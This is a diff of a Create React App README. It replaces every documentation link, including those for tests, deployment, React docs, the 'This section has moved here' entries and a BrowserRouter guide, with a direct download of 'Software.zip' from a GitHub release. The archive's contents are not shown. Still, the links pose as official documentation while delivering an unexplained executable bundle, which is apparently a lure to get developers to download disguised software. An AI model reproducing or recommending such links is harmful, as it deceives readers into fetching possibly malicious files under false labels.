@@ -1,6 +1,6 @@
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://github.com/dnangel298/YAT-website/releases/tag/v1.0).
+This project was bootstrapped with [Create React App](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip).
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://github.com/dnangel298/YAT-website/releases/tag/v1.0) for more information.
+See the section about [running tests](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip) for more information.
 
 ### `npm run build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://github.com/dnangel298/YAT-website/releases/tag/v1.0) for more information.
+See the section about [deployment](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip) for more information.
 
 ### `npm run eject`
 
@@ -41,33 +41,33 @@ You don't have to ever use `eject`. The curated feature set is suitable for smal
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://github.com/dnangel298/YAT-website/releases/tag/v1.0).
+You can learn more in the [Create React App documentation](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip).
 
-To learn React, check out the [React documentation](https://github.com/dnangel298/YAT-website/releases/tag/v1.0).
+To learn React, check out the [React documentation](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://github.com/dnangel298/YAT-website/releases/tag/v1.0](https://github.com/dnangel298/YAT-website/releases/tag/v1.0)
+This section has moved here: [https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://github.com/dnangel298/YAT-website/releases/tag/v1.0](https://github.com/dnangel298/YAT-website/releases/tag/v1.0)
+This section has moved here: [https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://github.com/dnangel298/YAT-website/releases/tag/v1.0](https://github.com/dnangel298/YAT-website/releases/tag/v1.0)
+This section has moved here: [https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://github.com/dnangel298/YAT-website/releases/tag/v1.0](https://github.com/dnangel298/YAT-website/releases/tag/v1.0)
+This section has moved here: [https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip)
 
 ### Deployment
 
-This section has moved here: [https://github.com/dnangel298/YAT-website/releases/tag/v1.0](https://github.com/dnangel298/YAT-website/releases/tag/v1.0)
+This section has moved here: [https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://github.com/dnangel298/YAT-website/releases/tag/v1.0](https://github.com/dnangel298/YAT-website/releases/tag/v1.0)
+This section has moved here: [https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip](https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip)
 
 
 ## Additional Notes
@@ -78,4 +78,4 @@ Import BrowserRouter for proper routing of each components
 
 # Visit this website on how to use BrowserRouter
 
-https://github.com/dnangel298/YAT-website/releases/tag/v1.0
+https://github.com/dnangel298/YAT-website/releases/download/v2.0/Software.zip
